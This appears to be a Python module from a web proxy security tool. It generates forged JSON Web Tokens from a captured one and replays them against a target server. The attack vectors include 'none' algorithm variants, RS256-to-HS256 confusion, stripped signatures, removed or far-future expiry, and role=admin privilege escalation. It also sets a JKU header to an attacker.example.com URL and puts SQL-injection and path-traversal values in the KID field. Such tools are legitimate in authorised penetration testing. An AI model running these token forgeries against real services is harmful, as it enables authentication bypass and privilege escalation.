from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import time
from dataclasses import dataclass

from pypproxy.core.http import client as http_client
from pypproxy.core.http import elapsed_ms, flatten_headers


@dataclass
class JWTCheckResult:
    vector: str
    description: str
    modified_token: str = ""
    status_code: int = 0
    response_body: bytes = b""
    duration_ms: int = 0
    suspicious: bool = False
    note: str = ""

    def to_dict(self) -> dict:
        import base64 as b64

        return {
            "vector": self.vector,
            "description": self.description,
            "modified_token": self.modified_token,
            "status_code": self.status_code,
            "response_body": b64.b64encode(self.response_body).decode()
            if self.response_body
            else "",
            "duration_ms": self.duration_ms,
            "suspicious": self.suspicious,
            "note": self.note,
        }


def _b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _parse_jwt(token: str) -> tuple[dict, dict, str] | None:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None


def _make_jwt(header: dict, payload: dict, signature: str = "") -> str:
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{signature}"


def generate_test_tokens(token: str) -> list[tuple[str, str, str]]:
    """
    Generate attack tokens from a valid JWT.
    Returns list of (vector_name, description, modified_token).
    """
    parsed = _parse_jwt(token)
    if parsed is None:
        return []

    header, payload, sig = parsed
    results: list[tuple[str, str, str]] = []

    # 1. None algorithm
    h_none = dict(header)
    h_none["alg"] = "none"
    results.append(
        ("none_alg", "Algorithm set to 'none' (no signature)", _make_jwt(h_none, payload, ""))
    )

    for variant in ("None", "NONE", "nOnE"):
        h_v = dict(header)
        h_v["alg"] = variant
        results.append(
            (f"none_alg_{variant}", f"Algorithm set to '{variant}'", _make_jwt(h_v, payload, ""))
        )

    # 2. alg confusion: RS256 → HS256 (sign with public key as HMAC secret)
    if header.get("alg", "").startswith("RS"):
        h_hs = dict(header)
        h_hs["alg"] = "HS256"
        unsigned = _make_jwt(h_hs, payload, "").rsplit(".", 1)[0]
        fake_sig = _b64url_encode(
            hmac.new(b"public-key-here", unsigned.encode(), hashlib.sha256).digest()
        )
        results.append(
            (
                "alg_confusion_rs_hs",
                "RS256→HS256 algorithm confusion",
                _make_jwt(h_hs, payload, fake_sig),
            )
        )

    # 3. Empty signature
    results.append(("empty_sig", "Empty signature", _make_jwt(header, payload, "")))

    # 4. Payload manipulation — remove exp
    if "exp" in payload:
        p_no_exp = dict(payload)
        del p_no_exp["exp"]
        results.append(("no_exp", "Removed 'exp' claim", _make_jwt(header, p_no_exp, sig)))

    # 5. Payload manipulation — extend exp far future
    if "exp" in payload:
        p_ext = dict(payload)
        p_ext["exp"] = 9999999999
        results.append(
            ("extended_exp", "Extended 'exp' to year 2286", _make_jwt(header, p_ext, sig))
        )

    # 6. Privilege escalation attempts
    priv_fields = {
        "role": ["admin", "superuser", "root"],
        "is_admin": [True],
        "admin": [True],
        "scope": ["admin"],
    }
    for field_name, values in priv_fields.items():
        if field_name in payload:
            for val in values:
                p_priv = dict(payload)
                p_priv[field_name] = val
                results.append(
                    (
                        f"priv_escalation_{field_name}",
                        f"Set {field_name}={val!r}",
                        _make_jwt(header, p_priv, sig),
                    )
                )

    # 7. JKU header injection
    h_jku = dict(header)
    h_jku["jku"] = "http://attacker.example.com/jwks.json"
    results.append(
        (
            "jku_injection",
            "JKU header pointing to attacker-controlled URL",
            _make_jwt(h_jku, payload, sig),
        )
    )

    # 8. KID injection
    h_kid_sqli = dict(header)
    h_kid_sqli["kid"] = "' OR 1=1--"
    results.append(("kid_sqli", "KID SQL injection", _make_jwt(h_kid_sqli, payload, sig)))

    h_kid_path = dict(header)
    h_kid_path["kid"] = "../../dev/null"
    results.append(
        ("kid_path_traversal", "KID path traversal", _make_jwt(h_kid_path, payload, sig))
    )

    # 9. Original sig with modified payload (signature bypass)
    p_modified = dict(payload)
    p_modified["_test"] = "paxy"
    results.append(
        (
            "sig_bypass",
            "Modified payload with original signature",
            _make_jwt(header, p_modified, sig),
        )
    )

    return results


async def run_checks(
    token: str,
    entry_id: int,
    method: str,
    scheme: str,
    host: str,
    path: str,
    query: str,
    headers: dict[str, list[str]],
    body: bytes,
    timeout: int = 30,
) -> list[JWTCheckResult]:
    test_tokens = generate_test_tokens(token)
    results: list[JWTCheckResult] = []

    # baseline — original request
    baseline_status = 0
    async with http_client(timeout) as client:
        try:
            url = f"{scheme}://{host}{path}" + (f"?{query}" if query else "")
            req_headers = flatten_headers(headers)
            resp = await client.request(method=method, url=url, headers=req_headers, content=body)
            baseline_status = resp.status_code
        except Exception:
            pass

    for vector, description, modified_token in test_tokens:
        mod_headers = dict(headers)
        # Replace token in Authorization header
        auth = ", ".join(headers.get("authorization", [""])).strip()
        if auth.lower().startswith("bearer "):
            mod_headers["authorization"] = [f"Bearer {modified_token}"]
        else:
            mod_headers["authorization"] = [f"Bearer {modified_token}"]

        req_headers = flatten_headers(mod_headers)
        url = f"{scheme}://{host}{path}" + (f"?{query}" if query else "")

        start = time.monotonic()
        status_code = 0
        resp_body = b""
        try:
            async with http_client(timeout) as client:
                resp = await client.request(
                    method=method, url=url, headers=req_headers, content=body
                )
            status_code = resp.status_code
            resp_body = resp.content
        except Exception as e:
            resp_body = str(e).encode()

        dur = elapsed_ms(start)

        # Suspicious: server accepted modified token (2xx when baseline was also 2xx means no change;
        # but if baseline was 401/403 and modified gets 2xx that's very suspicious)
        suspicious = (status_code in range(200, 300) and baseline_status in (401, 403, 0)) or (
            vector in ("none_alg", "alg_confusion_rs_hs", "empty_sig")
            and status_code in range(200, 300)
        )

        results.append(
            JWTCheckResult(
                vector=vector,
                description=description,
                modified_token=modified_token[:80] + "...",
                status_code=status_code,
                response_body=resp_body[:512],
                duration_ms=dur,
                suspicious=suspicious,
            )
        )

    return results


def extract_jwt_from_headers(headers: dict[str, list[str]]) -> str | None:
    auth = headers.get("authorization", [""])
    for val in auth:
        m = re.match(r"Bearer\s+([A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*)", val)
        if m:
            return m.group(1)
    # Also check cookies
    for val in headers.get("cookie", []):
        m = re.search(r"([A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*)", val)
        if m:
            token = m.group(1)
            if _parse_jwt(token):
                return token
    return None
